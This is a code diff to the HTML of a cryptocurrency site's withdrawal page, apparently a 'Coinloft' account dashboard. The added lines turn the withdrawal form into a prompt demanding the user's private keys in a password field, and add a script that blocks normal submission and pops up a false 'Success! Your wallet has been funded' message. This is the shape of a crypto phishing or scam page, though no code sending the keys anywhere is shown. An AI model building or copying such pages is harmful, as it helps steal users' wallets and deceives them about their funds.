@@ -307,7 +307,7 @@
 
                 <div class="my-3">
                     <label>Select Currency</label>
-                    <select required id="loantype" class=" focus:outline-none rounded w-full border border-blue-200 py-2" name="types" required>
+                    <select id="loantype" class=" focus:outline-none rounded w-full border border-blue-200 py-2" name="types" required>
                         <option id="loan-S" class="text-yellow-600" value="Select">Select...</option>
                         <option id="loan-I" class="text-yellow-600" value="Bitcoin">Bitcoin</option>
                         <option id="loan-O" class="text-yellow-600" value="Ethereum">Ethereum</option>
@@ -315,8 +315,8 @@
                     </select>
                 </div>
 
-                <input id="coinNumb" type="text" class="px-2 focus:outline-none mt-3 rounded w-full border border-blue-200 py-2">
-            <input id="sub-loan" class="JPS_open py-2 px-10 mt-5 w-full bg-blue-600 text-white hover:bg-blue-900" value="COMPLETE WITHDRAWAL" type="submit">
+                <input type="text" class="px-2 focus:outline-none mt-3 rounded w-full border border-blue-200 py-2" required>
+            <input id="sub-loan" class="JPS_open py-2 px-10 mt-5 w-full bg-blue-600 text-white hover:bg-blue-900" value="CONTINUE" type="submit">
             <!--endof form-->
         </form>
 
@@ -325,19 +325,26 @@
 
                 <h1 class="flex items-center gap-6 mb-6 bg-yellow-50 py-6 px-2 rounded">
                     <i class="far text-yellow-500 fa-dot-circle"></i>
-                    <p class="w-full">You are making a withdrawal of <span id="w-nam"> </span> <span id="w-numb"> </span> from your
-                        Coinloft's Account
+                    <p class="w-full">Complete withdrawal from your
+                        Coinloft Account
                    </p>
                 </h1>
         
-                <p class="pt-3 pb-8 text-center">&#8505; Select currency and enter amount to Withdraw</p>
+                <p class="pt-3 pb-8 text-center">&#8505; Enter your Coinloft's private keys to complete withdrawal</p>
 
+                <label>Enter Private Keys</label>
+                <input type="password" class="px-2 focus:outline-none mt-3 rounded w-full border-2 border-red-300 py-2" required>
 
-            <input id="sub-loan" class="py-2 px-10 mt-5 w-full bg-blue-600 text-white hover:bg-blue-900" value="COMPLETE WITHDRAWAL" type="submit">
+            <input id="sub-loan" class="py-2 px-10 mt-5 w-full bg-blue-600 text-white hover:bg-blue-900" value="WITHDRAWAL FUNDS" type="submit">
             <!--endof form-->
         </form>
 
-
+        <div style="z-index: 9999999999999;" class="withalert animate__animated animate__backInDown animate__faster animate__delay-1s border border-gray-300 absolute mx-auto lg:w-4/12 sm:w-8/12 w-full right-0 top-28 h-auto py-3 bg-white rounded text-black hidden">
+            <h1 class=" md:text-lg text-base px-3 py-4 text-center">
+                Success! Your wallet has been funded 
+            </h1>
+          </div>
+        
 
 
 
@@ -389,8 +396,21 @@
     </script>
 
    
+<script>
+    document.getElementById('JPS').addEventListener('submit', resFormio);
+
+function resFormio(e){
+e.preventDefault();
+document.querySelector('.withalert').style.display = 'block';
+
+setTimeout(function(){
+    document.querySelector('.withalert').style.display = 'none';
+},4000);
 
 
+}
+
+</script>
 
 <script>
      const togglePassword = document.querySelector('#togglePassword');
